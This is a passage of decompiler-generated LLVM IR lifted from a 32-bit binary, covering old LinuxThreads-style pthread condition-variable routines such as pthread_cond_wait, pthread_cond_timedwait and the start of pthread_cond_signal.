  store i32 %v3_805939c, i32* @ebx, align 4
  %v1_805939f = add i32 %v0_805939c, 441
  %v2_805939f = inttoptr i32 %v1_805939f to i8*
  store i8 1, i8* %v2_805939f, align 1
  %v0_80593a6 = load i32, i32* @esi, align 4
  %v1_80593a6 = add i32 %v0_80593a6, 8
  %v2_80593a6 = inttoptr i32 %v1_80593a6 to i32*
  store i32 0, i32* %v2_80593a6, align 4
  %v0_80593ad = load i32, i32* @esi, align 4
  store i32 %v0_80593ad, i32* @eax, align 4
  %v0_80593af = load i32, i32* @ebx, align 4
  store i32 %v0_80593af, i32* @esi, align 4
  %v0_80593b1 = call i32 @restart.12()
  %v0_80593b6 = load i32, i32* @esi, align 4
  %v1_80593b6 = icmp eq i32 %v0_80593b6, 0
  %v1_80593b8 = icmp eq i1 %v1_80593b6, false
  br i1 %v1_80593b8, label %dec_label_pc_805939c, label %dec_label_pc_80593ba

dec_label_pc_80593ba:                             ; preds = %dec_label_pc_805939c, %entry
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_80593b6, { 1, 0 }
  uselistorder i32 %v0_805939c, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805939c, { 1, 0 }
}

define i32 @thread_self.13(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_2096672 = alloca i32, align 4
  %v0_80593c7 = load i32, i32* @esp, align 4
  %v1_80593c7 = load i32, i32* @global_var_8078e6c.615, align 4
  %v7_80593c7 = icmp ult i32 %v0_80593c7, %v1_80593c7
  %v1_80593cd = icmp eq i1 %v7_80593c7, false
  br i1 %v1_80593cd, label %dec_label_pc_80593fe, label %dec_label_pc_80593cf

dec_label_pc_80593cf:                             ; preds = %entry
  %v1_80593cf = load i32, i32* @global_var_8078e70.616, align 16
  %v7_80593cf = icmp ult i32 %v0_80593c7, %v1_80593cf
  br i1 %v7_80593cf, label %dec_label_pc_80593e4, label %dec_label_pc_80593d7

dec_label_pc_80593d7:                             ; preds = %dec_label_pc_80593cf
  %v1_80593dc = load i32, i32* @global_var_8078e74.618, align 4
  %v7_80593dc = icmp ult i32 %v0_80593c7, %v1_80593dc
  br i1 %v7_80593dc, label %dec_label_pc_80593fe, label %dec_label_pc_80593e4

dec_label_pc_80593e4:                             ; preds = %dec_label_pc_80593d7, %dec_label_pc_80593cf
  %v0_80593e4 = load i32, i32* @global_var_807e578.619, align 8
  %v1_80593e4 = icmp eq i32 %v0_80593e4, 0
  br i1 %v1_80593e4, label %dec_label_pc_80593f2, label %dec_label_pc_80593ed

dec_label_pc_80593ed:                             ; preds = %dec_label_pc_80593e4
  %v0_80593ed = call i32 @__pthread_find_self()
  br label %dec_label_pc_80593f2

dec_label_pc_80593f2:                             ; preds = %dec_label_pc_80593e4, %dec_label_pc_80593ed
  %v2_80593f8 = ptrtoint i32* %stack_var_2096672 to i32
  br label %dec_label_pc_80593fe

dec_label_pc_80593fe:                             ; preds = %dec_label_pc_80593d7, %entry, %dec_label_pc_80593f2
  %v0_80593fe = phi i32 [ ptrtoint (i32* @global_var_8074340.617 to i32), %dec_label_pc_80593d7 ], [ ptrtoint (i32* @global_var_8074160 to i32), %entry ], [ %v2_80593f8, %dec_label_pc_80593f2 ]
  ret i32 %v0_80593fe

; uselistorder directives
  uselistorder label %dec_label_pc_80593fe, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80593f2, { 1, 0 }
}

define i32 @cond_extricate_func(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_80593ff = load i32, i32* @esi, align 4
  %v0_8059400 = load i32, i32* @ebx, align 4
  %v2_8059404 = call i32 @thread_self.13(i32 %v0_8059400, i32 %v0_80593ff)
  store i32 %arg1, i32* @ebx, align 4
  store i32 %v2_8059404, i32* @edx, align 4
  store i32 %arg1, i32* @eax, align 4
  %v1_8059417 = call i32 @__pthread_lock(i32 %v2_8059404)
  store i32 %arg2, i32* @edx, align 4
  %v0_8059420 = load i32, i32* @ebx, align 4
  %v1_8059420 = add i32 %v0_8059420, 8
  store i32 %v1_8059420, i32* @eax, align 4
  %v0_8059423 = call i32 @remove_from_queue.10()
  store i32 %v0_8059423, i32* @esi, align 4
  %v0_805942d = load i32, i32* @ebx, align 4
  %v1_805942e = inttoptr i32 %v0_805942d to i32*
  %v2_805942e = call i32 @__pthread_unlock(i32* %v1_805942e)
  %v0_8059433 = load i32, i32* @esi, align 4
  ret i32 %v0_8059433

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @suspend.14() local_unnamed_addr {
entry:
  %v0_805943e = load i32, i32* @eax, align 4
  %v1_805943f = call i32 @__pthread_wait_for_restart_signal(i32 %v0_805943e)
  ret i32 %v1_805943f
}

define i32 @__GI_pthread_cond_timedwait(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_805944a = load i32, i32* @esi, align 4
  %v0_805944b = load i32, i32* @ebx, align 4
  store i32 %v0_805944b, i32* %stack_var_-16, align 4
  %v4_805944b = ptrtoint i32* %stack_var_-16 to i32
  %v2_805944f = call i32 @thread_self.13(i32 %v0_805944b, i32 %v0_805944a)
  store i32 %arg2, i32* @ebp, align 4
  store i32 %arg1, i32* @esi, align 4
  %v1_8059460 = add i32 %arg2, 12
  %v2_8059460 = inttoptr i32 %v1_8059460 to i32*
  %v3_8059460 = load i32, i32* %v2_8059460, align 4
  %v9_8059463 = icmp eq i32 %v3_8059460, 3
  br i1 %v9_8059463, label %dec_label_pc_805947e, label %dec_label_pc_8059468

dec_label_pc_8059468:                             ; preds = %entry
  %v1_8059468 = icmp eq i32 %v3_8059460, 0
  br i1 %v1_8059468, label %dec_label_pc_805947e, label %dec_label_pc_805946c

dec_label_pc_805946c:                             ; preds = %dec_label_pc_8059468
  %v1_8059475 = add i32 %arg2, 8
  %v2_8059475 = inttoptr i32 %v1_8059475 to i32*
  %v3_8059475 = load i32, i32* %v2_8059475, align 4
  %v15_8059475 = icmp eq i32 %v3_8059475, %v2_805944f
  %v1_8059478 = icmp eq i1 %v15_8059475, false
  br i1 %v1_8059478, label %dec_label_pc_805946c.dec_label_pc_80595f0_crit_edge, label %dec_label_pc_805947e

dec_label_pc_805946c.dec_label_pc_80595f0_crit_edge: ; preds = %dec_label_pc_805946c
  br label %dec_label_pc_80595f0

dec_label_pc_805947e:                             ; preds = %dec_label_pc_805946c, %dec_label_pc_8059468, %entry
  store i32 %arg1, i32* %stack_var_-28, align 4
  %v2_805948e = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_805948e, i32* @edx, align 4
  %v1_8059492 = add i32 %v2_805944f, 441
  %v2_8059492 = inttoptr i32 %v1_8059492 to i8*
  store i8 0, i8* %v2_8059492, align 1
  store i32 %v2_805944f, i32* @eax, align 4
  %v0_805949d = load i32, i32* %stack_var_-28, align 4
  %v2_805949d = call i32 @__pthread_set_own_extricate_if.11(i32 %v0_805949d, i32 134583295)
  %v0_80594a2 = load i32, i32* @esi, align 4
  store i32 %v0_80594a2, i32* @eax, align 4
  store i32 %v2_805944f, i32* @edx, align 4
  %v1_80594a8 = call i32 @__pthread_lock(i32 134583295)
  %v1_80594b1 = add i32 %v2_805944f, 66
  %v2_80594b1 = inttoptr i32 %v1_80594b1 to i8*
  %v3_80594b1 = load i8, i8* %v2_80594b1, align 1
  %v4_80594b1 = icmp eq i8 %v3_80594b1, 0
  br i1 %v4_80594b1, label %dec_label_pc_80594c6, label %dec_label_pc_80594b7

dec_label_pc_80594b7:                             ; preds = %dec_label_pc_805947e
  store i32 1, i32* @ebx, align 4
  %v1_80594c0 = add i32 %v2_805944f, 64
  %v2_80594c0 = inttoptr i32 %v1_80594c0 to i8*
  %v3_80594c0 = load i8, i8* %v2_80594c0, align 1
  %v4_80594c0 = icmp eq i8 %v3_80594c0, 0
  br i1 %v4_80594c0, label %dec_label_pc_80594d4, label %dec_label_pc_80594c6

dec_label_pc_80594c6:                             ; preds = %dec_label_pc_80594b7, %dec_label_pc_805947e
  store i32 %v2_805944f, i32* @edx, align 4
  %v0_80594cd = call i32 @enqueue.9()
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_80594d4

dec_label_pc_80594d4:                             ; preds = %dec_label_pc_80594b7, %dec_label_pc_80594c6
  %v0_80594d7 = load i32, i32* @esi, align 4
  store i32 %v0_80594d7, i32* %stack_var_-60, align 4
  %v1_80594d8 = inttoptr i32 %v0_80594d7 to i32*
  %v2_80594d8 = call i32 @__pthread_unlock(i32* %v1_80594d8)
  %v0_80594e0 = load i32, i32* @ebx, align 4
  %v1_80594e0 = icmp eq i32 %v0_80594e0, 0
  br i1 %v1_80594e0, label %dec_label_pc_80594f6, label %dec_label_pc_80594e4

dec_label_pc_80594e4:                             ; preds = %dec_label_pc_80594d4
  store i32 %v2_805944f, i32* @eax, align 4
  store i32 0, i32* @edx, align 4
  %v0_80594ea = load i32, i32* %stack_var_-60, align 4
  %v1_80594ea = load i32, i32* %stack_var_-56, align 4
  %v2_80594ea = call i32 @__pthread_set_own_extricate_if.11(i32 %v0_80594ea, i32 %v1_80594ea)
  br label %dec_label_pc_80595ac

dec_label_pc_80594f6:                             ; preds = %dec_label_pc_80594d4
  store i32 0, i32* @edi, align 4
  %v0_80594fb = load i32, i32* @ebp, align 4
  store i32 %v0_80594fb, i32* %stack_var_-60, align 4
  %v1_80594fc = call i32 @pthread_mutex_unlock(i32 %v0_80594fb)
  %v3_805950f = inttoptr i32 %arg3 to i32*
  %v1_805955e = add i32 %v2_805944f, 440
  %v2_805955e = inttoptr i32 %v1_805955e to i8*
  %v1_805956b = add i32 %v2_805944f, 64
  %v2_805956b = inttoptr i32 %v1_805956b to i8*
  br label %dec_label_pc_8059504

dec_label_pc_8059504:                             ; preds = %dec_label_pc_8059571, %dec_label_pc_80594f6
  %v0_8059508 = load i32, i32* @edx, align 4
  store i32 %arg3, i32* %stack_var_-56, align 4
  store i32 %v2_805944f, i32* %stack_var_-60, align 4
  %v4_805950f = call i32 @__pthread_timedsuspend_new(i32 %v2_805944f, i32* %v3_805950f, i32 %v0_8059508)
  %v1_8059517 = icmp eq i32 %v4_805950f, 0
  %v1_8059519 = icmp eq i1 %v1_8059517, false
  br i1 %v1_8059519, label %dec_label_pc_805954d, label %dec_label_pc_805951b

dec_label_pc_805951b:                             ; preds = %dec_label_pc_8059504
  store i32 %v2_805944f, i32* @edx, align 4
  %v0_805951f = load i32, i32* @esi, align 4
  store i32 %v0_805951f, i32* @eax, align 4
  %v0_8059521 = load i32, i32* %stack_var_-60, align 4
  %v1_8059521 = call i32 @__pthread_lock(i32 %v0_8059521)
  store i32 %v2_805944f, i32* @edx, align 4
  %v0_805952a = load i32, i32* @esi, align 4
  %v1_805952a = add i32 %v0_805952a, 8
  store i32 %v1_805952a, i32* @eax, align 4
  %v0_805952d = call i32 @remove_from_queue.10()
  store i32 %v0_805952d, i32* @ebx, align 4
  %v0_8059537 = load i32, i32* @esi, align 4
  store i32 %v0_8059537, i32* %stack_var_-60, align 4
  %v1_8059538 = inttoptr i32 %v0_8059537 to i32*
  %v2_8059538 = call i32 @__pthread_unlock(i32* %v1_8059538)
  %v1_8059540 = icmp eq i32 %v0_805952d, 0
  %v1_8059542 = icmp eq i1 %v1_8059540, false
  br i1 %v1_8059542, label %dec_label_pc_80595b8, label %dec_label_pc_8059544

dec_label_pc_8059544:                             ; preds = %dec_label_pc_805951b
  store i32 %v2_805944f, i32* @eax, align 4
  %v0_8059548 = call i32 @suspend.14()
  br label %dec_label_pc_805954d

dec_label_pc_805954d:                             ; preds = %dec_label_pc_8059504, %dec_label_pc_8059544
  %v3_8059551 = load i8, i8* %v2_8059492, align 1
  %v4_8059551 = icmp eq i8 %v3_8059551, 0
  %v1_8059558 = icmp eq i1 %v4_8059551, false
  br i1 %v1_8059558, label %dec_label_pc_8059574, label %dec_label_pc_805955a

dec_label_pc_805955a:                             ; preds = %dec_label_pc_805954d
  %v3_805955e = load i8, i8* %v2_805955e, align 1
  %v4_805955e = icmp eq i8 %v3_805955e, 0
  br i1 %v4_805955e, label %dec_label_pc_8059571, label %dec_label_pc_8059567

dec_label_pc_8059567:                             ; preds = %dec_label_pc_805955a
  %v3_805956b = load i8, i8* %v2_805956b, align 1
  %v4_805956b = icmp eq i8 %v3_805956b, 0
  br i1 %v4_805956b, label %dec_label_pc_8059574, label %dec_label_pc_8059571

dec_label_pc_8059571:                             ; preds = %dec_label_pc_8059567, %dec_label_pc_805955a
  %v0_8059571 = load i32, i32* @edi, align 4
  %v1_8059571 = add i32 %v0_8059571, 1
  store i32 %v1_8059571, i32* @edi, align 4
  br label %dec_label_pc_8059504

dec_label_pc_8059574:                             ; preds = %dec_label_pc_8059567, %dec_label_pc_805954d
  store i32 %v2_805944f, i32* @eax, align 4
  store i32 0, i32* @edx, align 4
  %v0_805957a = load i32, i32* %stack_var_-60, align 4
  %v1_805957a = load i32, i32* %stack_var_-56, align 4
  %v2_805957a = call i32 @__pthread_set_own_extricate_if.11(i32 %v0_805957a, i32 %v1_805957a)
  %v3_8059583 = load i8, i8* %v2_805955e, align 1
  %v4_8059583 = icmp eq i8 %v3_8059583, 0
  br i1 %v4_8059583, label %dec_label_pc_80595dc.preheader, label %dec_label_pc_805958c

dec_label_pc_805958c:                             ; preds = %dec_label_pc_8059574
  %v3_8059590 = load i8, i8* %v2_805956b, align 1
  %v4_8059590 = icmp eq i8 %v3_8059590, 0
  %v1_8059594 = icmp eq i1 %v4_8059590, false
  br i1 %v1_8059594, label %dec_label_pc_80595dc.preheader, label %dec_label_pc_8059596

dec_label_pc_80595dc.preheader:                   ; preds = %dec_label_pc_8059574, %dec_label_pc_805958c
  %v0_80595dc19 = load i32, i32* @edi, align 4
  %v1_80595dc20 = add i32 %v0_80595dc19, -1
  store i32 %v1_80595dc20, i32* @edi, align 4
  %v10_80595dd26 = icmp eq i32 %v0_80595dc19, 0
  %v1_80595e027 = icmp eq i1 %v10_80595dd26, false
  br i1 %v1_80595e027, label %dec_label_pc_80595d3, label %dec_label_pc_80595e2

dec_label_pc_8059596:                             ; preds = %dec_label_pc_805958c
  store i8 0, i8* %v2_805955e, align 1
  %v0_80595a4 = load i32, i32* @ebp, align 4
  store i32 %v0_80595a4, i32* %stack_var_-60, align 4
  %v1_80595a5 = call i32 @pthread_mutex_lock(i32 %v0_80595a4)
  store i32 %v0_80595a4, i32* @ecx, align 4
  %v2_80595ab = load i32, i32* %stack_var_-56, align 4
  store i32 %v2_80595ab, i32* @ebx, align 4
  br label %dec_label_pc_80595ac

dec_label_pc_80595ac:                             ; preds = %dec_label_pc_80594e4, %dec_label_pc_8059596
  store i32 %v4_805944b, i32* %stack_var_-56, align 4
  store i32 -1, i32* %stack_var_-60, align 4
  %v2_80595b3 = call i32 @__pthread_do_exit(i32 -1, i32 %v4_805944b)
  br label %dec_label_pc_80595b8

dec_label_pc_80595b8:                             ; preds = %dec_label_pc_805951b, %dec_label_pc_80595ac
  store i32 %v2_805944f, i32* @eax, align 4
  store i32 0, i32* @edx, align 4
  %v0_80595be = load i32, i32* %stack_var_-60, align 4
  %v1_80595be = load i32, i32* %stack_var_-56, align 4
  %v2_80595be = call i32 @__pthread_set_own_extricate_if.11(i32 %v0_80595be, i32 %v1_80595be)
  %v0_80595c6 = load i32, i32* @ebp, align 4
  store i32 %v0_80595c6, i32* %stack_var_-60, align 4
  %v1_80595c7 = call i32 @pthread_mutex_lock(i32 %v0_80595c6)
  br label %dec_label_pc_80595ed

dec_label_pc_80595d3:                             ; preds = %dec_label_pc_80595dc.preheader, %dec_label_pc_80595d3
  store i32 %v2_805944f, i32* @eax, align 4
  %v0_80595d7 = call i32 @restart.12()
  %v0_80595dc = load i32, i32* @edi, align 4
  %v1_80595dc = add i32 %v0_80595dc, -1
  store i32 %v1_80595dc, i32* @edi, align 4
  %v10_80595dd = icmp eq i32 %v0_80595dc, 0
  %v1_80595e0 = icmp eq i1 %v10_80595dd, false
  br i1 %v1_80595e0, label %dec_label_pc_80595d3, label %dec_label_pc_80595e2

dec_label_pc_80595e2:                             ; preds = %dec_label_pc_80595d3, %dec_label_pc_80595dc.preheader
  %v0_80595e5 = load i32, i32* @ebp, align 4
  store i32 %v0_80595e5, i32* %stack_var_-60, align 4
  %v1_80595e6 = call i32 @pthread_mutex_lock(i32 %v0_80595e5)
  br label %dec_label_pc_80595ed

dec_label_pc_80595ed:                             ; preds = %dec_label_pc_80595b8, %dec_label_pc_80595e2
  %storemerge1 = phi i32 [ 110, %dec_label_pc_80595b8 ], [ 0, %dec_label_pc_80595e2 ]
  br label %dec_label_pc_80595f0

dec_label_pc_80595f0:                             ; preds = %dec_label_pc_805946c.dec_label_pc_80595f0_crit_edge, %dec_label_pc_80595ed
  %v0_80595f3 = phi i32 [ 22, %dec_label_pc_805946c.dec_label_pc_80595f0_crit_edge ], [ %storemerge1, %dec_label_pc_80595ed ]
  ret i32 %v0_80595f3

; uselistorder directives
  uselistorder i32 %v0_805952d, { 1, 0 }
  uselistorder i32 %v3_8059460, { 1, 0 }
  uselistorder i32 %v2_805944f, { 11, 10, 12, 5, 6, 7, 2, 1, 8, 9, 4, 13, 3, 14, 15, 16, 17, 0 }
  uselistorder i32 %v4_805944b, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-28, { 0, 2, 1 }
  uselistorder i32* %stack_var_-56, { 1, 3, 4, 2, 5, 0 }
  uselistorder i32* %stack_var_-60, { 4, 5, 1, 6, 7, 2, 8, 3, 9, 10, 0, 11 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80595f0, { 1, 0 }
  uselistorder label %dec_label_pc_80595ed, { 1, 0 }
  uselistorder label %dec_label_pc_80595d3, { 1, 0 }
  uselistorder label %dec_label_pc_80595b8, { 1, 0 }
  uselistorder label %dec_label_pc_80595ac, { 1, 0 }
  uselistorder label %dec_label_pc_80595dc.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_805954d, { 1, 0 }
  uselistorder label %dec_label_pc_80594d4, { 1, 0 }
}

define i32 @__GI_pthread_cond_wait(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_80595fd = load i32, i32* @edi, align 4
  %v0_80595fe = load i32, i32* @esi, align 4
  %v0_80595ff = load i32, i32* @ebx, align 4
  store i32 %v0_80595ff, i32* %stack_var_-16, align 4
  %v4_80595ff = ptrtoint i32* %stack_var_-16 to i32
  %v2_8059603 = call i32 @thread_self.13(i32 %v0_80595ff, i32 %v0_80595fe)
  store i32 %arg2, i32* @edi, align 4
  store i32 %arg1, i32* @esi, align 4
  %v1_8059611 = add i32 %arg2, 12
  %v2_8059611 = inttoptr i32 %v1_8059611 to i32*
  %v3_8059611 = load i32, i32* %v2_8059611, align 4
  %v9_8059614 = icmp eq i32 %v3_8059611, 3
  br i1 %v9_8059614, label %dec_label_pc_805962e, label %dec_label_pc_8059619

dec_label_pc_8059619:                             ; preds = %entry
  %v1_8059619 = icmp eq i32 %v3_8059611, 0
  br i1 %v1_8059619, label %dec_label_pc_805962e, label %dec_label_pc_805961d

dec_label_pc_805961d:                             ; preds = %dec_label_pc_8059619
  %v1_8059625 = add i32 %arg2, 8
  %v2_8059625 = inttoptr i32 %v1_8059625 to i32*
  %v3_8059625 = load i32, i32* %v2_8059625, align 4
  %v15_8059625 = icmp eq i32 %v3_8059625, %v2_8059603
  %v1_8059628 = icmp eq i1 %v15_8059625, false
  br i1 %v1_8059628, label %dec_label_pc_805972e, label %dec_label_pc_805962e

dec_label_pc_805962e:                             ; preds = %dec_label_pc_805961d, %dec_label_pc_8059619, %entry
  store i32 %arg1, i32* %stack_var_-28, align 4
  %v2_805963b = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_805963b, i32* @edx, align 4
  %v1_805963e = add i32 %v2_8059603, 441
  %v2_805963e = inttoptr i32 %v1_805963e to i8*
  store i8 0, i8* %v2_805963e, align 1
  store i32 %v2_8059603, i32* @eax, align 4
  %v0_8059648 = load i32, i32* %stack_var_-28, align 4
  %v2_8059648 = call i32 @__pthread_set_own_extricate_if.11(i32 %v0_8059648, i32 134583295)
  %v0_805964d = load i32, i32* @esi, align 4
  store i32 %v0_805964d, i32* @eax, align 4
  store i32 %v2_8059603, i32* @edx, align 4
  %v1_8059652 = call i32 @__pthread_lock(i32 134583295)
  %v1_805965a = add i32 %v2_8059603, 66
  %v2_805965a = inttoptr i32 %v1_805965a to i8*
  %v3_805965a = load i8, i8* %v2_805965a, align 1
  %v4_805965a = icmp eq i8 %v3_805965a, 0
  br i1 %v4_805965a, label %dec_label_pc_805966e, label %dec_label_pc_8059660

dec_label_pc_8059660:                             ; preds = %dec_label_pc_805962e
  store i32 1, i32* @ebx, align 4
  %v1_8059668 = add i32 %v2_8059603, 64
  %v2_8059668 = inttoptr i32 %v1_8059668 to i8*
  %v3_8059668 = load i8, i8* %v2_8059668, align 1
  %v4_8059668 = icmp eq i8 %v3_8059668, 0
  br i1 %v4_8059668, label %dec_label_pc_805967b, label %dec_label_pc_805966e

dec_label_pc_805966e:                             ; preds = %dec_label_pc_8059660, %dec_label_pc_805962e
  store i32 %v2_8059603, i32* @edx, align 4
  %v0_8059674 = call i32 @enqueue.9()
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_805967b

dec_label_pc_805967b:                             ; preds = %dec_label_pc_8059660, %dec_label_pc_805966e
  %v0_805967e = load i32, i32* @esi, align 4
  store i32 %v0_805967e, i32* %stack_var_-60, align 4
  %v1_805967f = inttoptr i32 %v0_805967e to i32*
  %v2_805967f = call i32 @__pthread_unlock(i32* %v1_805967f)
  %v0_8059687 = load i32, i32* @ebx, align 4
  %v1_8059687 = icmp eq i32 %v0_8059687, 0
  br i1 %v1_8059687, label %dec_label_pc_8059699, label %dec_label_pc_805968b

dec_label_pc_805968b:                             ; preds = %dec_label_pc_805967b
  store i32 %v2_8059603, i32* @eax, align 4
  store i32 0, i32* @edx, align 4
  %v0_8059690 = load i32, i32* %stack_var_-60, align 4
  %v1_8059690 = load i32, i32* %stack_var_-56, align 4
  %v2_8059690 = call i32 @__pthread_set_own_extricate_if.11(i32 %v0_8059690, i32 %v1_8059690)
  br label %dec_label_pc_8059707

dec_label_pc_8059699:                             ; preds = %dec_label_pc_805967b
  store i32 0, i32* @ebx, align 4
  %v0_805969e = load i32, i32* @edi, align 4
  store i32 %v0_805969e, i32* %stack_var_-60, align 4
  %v1_805969f = call i32 @pthread_mutex_unlock(i32 %v0_805969e)
  %v1_80596be = add i32 %v2_8059603, 440
  %v2_80596be = inttoptr i32 %v1_80596be to i8*
  %v1_80596ca = add i32 %v2_8059603, 64
  %v2_80596ca = inttoptr i32 %v1_80596ca to i8*
  store i32 %v2_8059603, i32* @eax, align 4
  %v0_80596aa16 = call i32 @suspend.14()
  %v3_80596b217 = load i8, i8* %v2_805963e, align 1
  %v4_80596b218 = icmp eq i8 %v3_80596b217, 0
  %v1_80596b919 = icmp eq i1 %v4_80596b218, false
  br i1 %v1_80596b919, label %dec_label_pc_80596d3, label %dec_label_pc_80596bb

dec_label_pc_80596bb:                             ; preds = %dec_label_pc_8059699, %dec_label_pc_80596d0
  %v3_80596be = load i8, i8* %v2_80596be, align 1
  %v4_80596be = icmp eq i8 %v3_80596be, 0
  br i1 %v4_80596be, label %dec_label_pc_80596d0, label %dec_label_pc_80596c7

dec_label_pc_80596c7:                             ; preds = %dec_label_pc_80596bb
  %v3_80596ca = load i8, i8* %v2_80596ca, align 1
  %v4_80596ca = icmp eq i8 %v3_80596ca, 0
  br i1 %v4_80596ca, label %dec_label_pc_80596d3, label %dec_label_pc_80596d0

dec_label_pc_80596d0:                             ; preds = %dec_label_pc_80596c7, %dec_label_pc_80596bb
  %v0_80596d0 = load i32, i32* @ebx, align 4
  %v1_80596d0 = add i32 %v0_80596d0, 1
  store i32 %v1_80596d0, i32* @ebx, align 4
  store i32 %v2_8059603, i32* @eax, align 4
  %v0_80596aa = call i32 @suspend.14()
  %v3_80596b2 = load i8, i8* %v2_805963e, align 1
  %v4_80596b2 = icmp eq i8 %v3_80596b2, 0
  %v1_80596b9 = icmp eq i1 %v4_80596b2, false
  br i1 %v1_80596b9, label %dec_label_pc_80596d3, label %dec_label_pc_80596bb

dec_label_pc_80596d3:                             ; preds = %dec_label_pc_80596d0, %dec_label_pc_80596c7, %dec_label_pc_8059699
  store i32 %v2_8059603, i32* @eax, align 4
  store i32 0, i32* @edx, align 4
  %v0_80596d8 = load i32, i32* %stack_var_-60, align 4
  %v1_80596d8 = load i32, i32* %stack_var_-56, align 4
  %v2_80596d8 = call i32 @__pthread_set_own_extricate_if.11(i32 %v0_80596d8, i32 %v1_80596d8)
  %v3_80596e0 = load i8, i8* %v2_80596be, align 1
  %v4_80596e0 = icmp eq i8 %v3_80596e0, 0
  br i1 %v4_80596e0, label %dec_label_pc_805971a, label %dec_label_pc_80596e9

dec_label_pc_80596e9:                             ; preds = %dec_label_pc_80596d3
  %v3_80596ec = load i8, i8* %v2_80596ca, align 1
  %v4_80596ec = icmp eq i8 %v3_80596ec, 0
  %v1_80596f0 = icmp eq i1 %v4_80596ec, false
  br i1 %v1_80596f0, label %dec_label_pc_805971a, label %dec_label_pc_80596f2

dec_label_pc_80596f2:                             ; preds = %dec_label_pc_80596e9
  store i8 0, i8* %v2_80596be, align 1
  %v0_80596ff = load i32, i32* @edi, align 4
  store i32 %v0_80596ff, i32* %stack_var_-60, align 4
  %v1_8059700 = call i32 @pthread_mutex_lock(i32 %v0_80596ff)
  store i32 %v0_80596ff, i32* @ebx, align 4
  %v2_8059706 = load i32, i32* %stack_var_-56, align 4
  store i32 %v2_8059706, i32* @esi, align 4
  br label %dec_label_pc_8059707

dec_label_pc_8059707:                             ; preds = %dec_label_pc_805968b, %dec_label_pc_80596f2
  store i32 %v4_80595ff, i32* %stack_var_-56, align 4
  store i32 -1, i32* %stack_var_-60, align 4
  %v2_805970d = call i32 @__pthread_do_exit(i32 -1, i32 %v4_80595ff)
  br label %dec_label_pc_8059712

dec_label_pc_8059712:                             ; preds = %dec_label_pc_805971a, %dec_label_pc_8059707
  store i32 %v2_8059603, i32* @eax, align 4
  %v0_8059715 = call i32 @restart.12()
  br label %dec_label_pc_805971a

dec_label_pc_805971a:                             ; preds = %dec_label_pc_80596e9, %dec_label_pc_80596d3, %dec_label_pc_8059712
  %v0_805971a = load i32, i32* @ebx, align 4
  %v1_805971a = add i32 %v0_805971a, -1
  store i32 %v1_805971a, i32* @ebx, align 4
  %v10_805971b = icmp eq i32 %v0_805971a, 0
  %v1_805971e = icmp eq i1 %v10_805971b, false
  br i1 %v1_805971e, label %dec_label_pc_8059712, label %dec_label_pc_8059720

dec_label_pc_8059720:                             ; preds = %dec_label_pc_805971a
  %v0_8059723 = load i32, i32* @edi, align 4
  store i32 %v0_8059723, i32* %stack_var_-60, align 4
  %v1_8059724 = call i32 @pthread_mutex_lock(i32 %v0_8059723)
  br label %dec_label_pc_805972e

dec_label_pc_805972e:                             ; preds = %dec_label_pc_805961d, %dec_label_pc_8059720
  %v0_8059731 = phi i32 [ 22, %dec_label_pc_805961d ], [ 0, %dec_label_pc_8059720 ]
  %v2_8059733 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8059733, i32* @ebx, align 4
  store i32 %v0_80595fe, i32* @esi, align 4
  store i32 %v0_80595fd, i32* @edi, align 4
  ret i32 %v0_8059731

; uselistorder directives
  uselistorder i8* %v2_805963e, { 1, 0, 2 }
  uselistorder i32 %v3_8059611, { 1, 0 }
  uselistorder i32 %v2_8059603, { 6, 7, 8, 1, 4, 5, 3, 9, 2, 11, 10, 12, 13, 0 }
  uselistorder i32 %v4_80595ff, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 0, 2, 1 }
  uselistorder i32* %stack_var_-28, { 0, 2, 1 }
  uselistorder i32* %stack_var_-56, { 2, 3, 1, 0 }
  uselistorder i32* %stack_var_-60, { 2, 3, 4, 1, 5, 0, 6 }
  uselistorder i32 ()* @suspend.14, { 1, 0, 2 }
  uselistorder i32 (i32, i32)* @__pthread_set_own_extricate_if.11, { 2, 1, 0, 6, 5, 4, 3 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_805972e, { 1, 0 }
  uselistorder label %dec_label_pc_805971a, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8059707, { 1, 0 }
  uselistorder label %dec_label_pc_80596bb, { 1, 0 }
  uselistorder label %dec_label_pc_805967b, { 1, 0 }
}

define i32 @pthread_cond_signal(i32 %arg1) local_unnamed_addr {
entry:
  %v0_8059739 = load i32, i32* @ebx, align 4
  store i32 0, i32* @edx, align 4
  store i32 %arg1, i32* @esi, align 4
  store i32 %arg1, i32* @eax, align 4
  %v1_8059745 = call i32 @__pthread_lock(i32 %v0_8059739)
  %v0_805974a = load i32, i32* @esi, align 4
  %v1_805974a = add i32 %v0_805974a, 8
  %v2_805974a = inttoptr i32 %v1_805974a to i32*
  %v3_805974a = load i32, i32* %v2_805974a, align 4
  store i32 %v3_805974a, i32* @ebx, align 4
  %v1_805974d = icmp eq i32 %v3_805974a, 0
  br i1 %v1_805974d, label %dec_label_pc_805975e, label %dec_label_pc_8059751

dec_label_pc_8059751:                             ; preds = %entry
